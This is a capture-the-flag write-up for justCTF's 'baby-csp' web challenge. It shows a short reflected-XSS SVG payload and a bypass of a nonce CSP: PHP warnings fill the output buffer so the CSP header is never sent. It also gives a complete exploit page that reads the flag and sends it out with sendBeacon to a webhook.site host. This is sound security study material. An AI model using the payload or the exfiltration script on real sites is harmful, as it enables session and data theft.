@@ -1,0 +1,67 @@
+3 Vulnerabilities
+
+	Reflected XSS
+		https://baby-csp.web.jctf.pro/?user=<u>foo</u>
+
+		23 characters limit
+			Reference: https://github.com/terjanq/Tiny-XSS-Payloads
+
+			<svg/onload=eval(name)>
+
+		https://baby-csp.web.jctf.pro/?user=%3Csvg/onload=eval(name)%3E
+			This would normally eval the code inside the page, but unforunately this would be blocked by a very strict, nonce-based, CSP (Content-Security-Policy).
+			
+			Refused to execute inline event handler because it violates the following Content Security Policy directive: "script-src 'nonce-87cf32fcd6d3e5ae501b79866c12f03a'". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution.
+
+	PHP Warnings
+		Because PHP running in development mode
+			RUN mv "$PHP_INI_DIR/php.ini-development" "$PHP_INI_DIR/php.ini" (from Dockerfile)
+
+		# Invalid alg
+		https://baby-csp.web.jctf.pro/?user=<u>foo</u>&alg=aaa
+			Warning: hash(): Unknown hashing algorithm: aaa in /var/www/html/index.php on line 21
+
+			Warning: hash(): Unknown hashing algorithm: aaa in /var/www/html/index.php on line 21
+
+			Warning: hash(): Unknown hashing algorithm: aaa in /var/www/html/index.php on line 21
+
+			Warning: hash(): Unknown hashing algorithm: aaa in /var/www/html/index.php on line 21
+
+			Warning: hash(): Unknown hashing algorithm: aaa in /var/www/html/index.php on line 21
+
+			Warning: hash(): Unknown hashing algorithm: aaa in /var/www/html/index.php on line 21
+
+			Warning: hash(): Unknown hashing algorithm: aaa in /var/www/html/index.php on line 21
+
+			Warning: hash(): Unknown hashing algorithm: aaa in /var/www/html/index.php on line 21
+
+			Warning: hash(): Unknown hashing algorithm: aaa in /var/www/html/index.php on line 21
+
+			Warning: hash(): Unknown hashing algorithm: aaa in /var/www/html/index.php on line 21
+
+	Order matters
+		Normally, in PHP, when you return any body data before header() is called, the call will be ignored because the response was already sent to the user and headers must be sent first. In the application there was no explicit data returned before calling header("content-security-policy: ..."); but because warnings were displayed first, they went into the response buffer before the header had a chance to get there in time.
+
+		PHP is known for buffering the response to 4096 bytes by default, so by providing enough data inside warnings, the response will be sent before the CSP header, causing the header to be ignored. Hence, it is possible to execute our SVG payload.
+
+		There is also another limit for the size of the warning (1kb if I recall correctly) so it is needed to force around 4 warnings 1000 characters each.
+
+
+https://webhook.site/4e07cb47-a180-47cf-9ac0-ac54ecdf385f
+	Edit
+		Content type: text/html
+
+		Response Body
+			<script>
+			    name="fetch('?flag').then(e=>e.text()).then(e=>navigator.sendBeacon('https://webhook.site/4e07cb47-a180-47cf-9ac0-ac54ecdf385f/flag',e))"
+			    
+			    location = 'https://baby-csp.web.jctf.pro/?user=%3Csvg%20onload=eval(name)%3E&alg='+'a'.repeat('292');
+			    
+			</script>
+
+
+
+https://baby-csp.web.jctf.pro/bugbounty.php
+	Send https://webhook.site/37b67bf9-a44c-4ca1-81b5-39962bcadc69
+
+justCTF{http_h3aders_buFFer1ng_so_c00l}
